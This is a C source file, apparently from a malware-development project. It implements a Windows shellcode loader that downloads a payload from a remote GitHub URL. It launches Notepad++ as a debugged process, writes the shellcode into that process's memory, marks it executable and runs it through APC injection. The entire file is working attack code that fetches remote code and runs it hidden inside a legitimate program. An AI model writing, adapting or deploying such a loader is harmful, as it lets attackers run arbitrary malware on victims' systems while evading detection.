#include "headerfile.h"


int main(void)
{
	// Staging Payload
	PBYTE	pPayload		= NULL;
	SIZE_T	sPayloadSize	= 0;

	if (!GetPayloadFromUrl(L"https://raw.githubusercontent.com/4dorable/Maldev/master/payload.bin", &pPayload, &sPayloadSize)) { return -1; }

	// Create Suspended Process
	DWORD  dwProcessID	= 0;
	HANDLE hProcess		= NULL;
	HANDLE hThread		= NULL;

	if (!CreateDebugProcess(L"C:\\Program Files\\Notepad++\\notepad++.exe", &dwProcessID, &hProcess, &hThread)) { return -1; }
	

	// Write Payload in Process
	if (!InjectShellcodeToRemoteProcess(hProcess, pPayload, sPayloadSize, hThread)) { return -1; }
	if (!DebugActiveProcessStop(dwProcessID)) {
		printf("[!] DebugActiveProcessStop Failed With Error: %lu\n", GetLastError());
		return -1;
	};


	if (pPayload)
		LocalFree(pPayload);

	if (hThread)
		CloseHandle(hThread);

	if (hProcess)
		CloseHandle(hProcess);

	return 0;

}


BOOL GetPayloadFromUrl(LPCWSTR szUrl, PBYTE* pPayloadBytes, SIZE_T* sPayloadSize) {

	BOOL		bSTATE			= TRUE;

	HINTERNET	hInternet		= NULL,
				hInternetFile	= NULL;

	DWORD		dwBytesRead		= 0;

	SIZE_T		sSize			= 0;

	PBYTE		pBytes			= NULL,
				pTmpBytes		= NULL;


	hInternet = InternetOpenW(NULL, NULL, NULL, NULL, NULL);
	if (hInternet == NULL) {
		printf("[!] InternetOpenW Failed With Error : %d \n", GetLastError());
		bSTATE = FALSE; goto _EndOfFunction;
	}


	hInternetFile = InternetOpenUrlW(
		hInternet,
		szUrl,
		NULL,
		0,
		INTERNET_FLAG_SECURE |
		INTERNET_FLAG_RELOAD |
		INTERNET_FLAG_NO_CACHE_WRITE,
		0
	);
	if (hInternetFile == NULL) {
		printf("[!] InternetOpenUrlW Failed With Error : %d \n", GetLastError());
		bSTATE = FALSE; goto _EndOfFunction;
	}


	pTmpBytes = (PBYTE)LocalAlloc(LPTR, 1024);
	if (pTmpBytes == NULL) {
		bSTATE = FALSE; goto _EndOfFunction;
	}

	while (TRUE) {

		if (!InternetReadFile(hInternetFile, pTmpBytes, 1024, &dwBytesRead)) {
			printf("[!] InternetReadFile Failed With Error : %d \n", GetLastError());
			bSTATE = FALSE; goto _EndOfFunction;
		}

		sSize += dwBytesRead;

		if (pBytes == NULL)
			pBytes = (PBYTE)LocalAlloc(LPTR, dwBytesRead);
		else
			pBytes = (PBYTE)LocalReAlloc(pBytes, sSize, LMEM_MOVEABLE | LMEM_ZEROINIT);

		if (pBytes == NULL) {
			bSTATE = FALSE; goto _EndOfFunction;
		}

		memcpy((PVOID)(pBytes + (sSize - dwBytesRead)), pTmpBytes, dwBytesRead);
		memset(pTmpBytes, '\0', dwBytesRead);

		if (dwBytesRead < 1024) {
			break;
		}
	}


	*pPayloadBytes	= pBytes;
	*sPayloadSize	= sSize;

_EndOfFunction:
	if (hInternet)
		InternetCloseHandle(hInternet);
	if (hInternetFile)
		InternetCloseHandle(hInternetFile);
	if (hInternet)
		InternetSetOptionW(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0);
	if (pTmpBytes)
		LocalFree(pTmpBytes);
	return bSTATE;
}


BOOL CreateDebugProcess(LPCWSTR lpProcessName, DWORD* dwProcessId, HANDLE* hProcess, HANDLE* hThread)
{
	BOOL				bSTATE	= TRUE;

	STARTUPINFO			Si		= { 0 };
	PROCESS_INFORMATION Pi		= { 0 };

	Si.cb = sizeof(STARTUPINFO);


	if (!CreateProcessW(lpProcessName, NULL, NULL, NULL, FALSE, DEBUG_PROCESS, NULL, NULL, &Si, &Pi))
	{
		printf("[!] Create Process Failed With Error : %d \n", GetLastError());
		bSTATE = FALSE; goto _EndOfFunction;
	}

	*dwProcessId	= Pi.dwProcessId;
	*hProcess		= Pi.hProcess;
	*hThread		= Pi.hThread;
	if (*dwProcessId == 0 || *hProcess == NULL || *hThread == NULL) {
		bSTATE = FALSE;
		goto _EndOfFunction;
	}
	
	bSTATE = TRUE;

_EndOfFunction:
	return bSTATE;
}


BOOL InjectShellcodeToRemoteProcess(HANDLE hProcess, PBYTE pShellcode, SIZE_T sSizeOfShellcode, HANDLE hThread) {

	PVOID	pShellcodeAddress = NULL;

	SIZE_T	sNumberOfBytesWritten = NULL;
	DWORD	dwOldProtection = NULL;


	pShellcodeAddress = VirtualAllocEx(hProcess, NULL, sSizeOfShellcode, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (pShellcodeAddress == NULL) {
		printf("[!] VirtualAllocEx Failed With Error : %d \n", GetLastError());
		return FALSE;
	}
	
	if (!WriteProcessMemory(hProcess, pShellcodeAddress, pShellcode, sSizeOfShellcode, &sNumberOfBytesWritten) || sNumberOfBytesWritten != sSizeOfShellcode) {
		printf("[!] WriteProcessMemory Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	memset(pShellcode, '\0', sSizeOfShellcode);

	if (!VirtualProtectEx(hProcess, pShellcodeAddress, sSizeOfShellcode, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
		printf("[!] VirtualProtectEx Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	if (!QueueUserAPC((PTHREAD_START_ROUTINE)pShellcodeAddress, hThread, NULL)) {
		printf("\t[!] QueueUserAPC Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	return TRUE;

}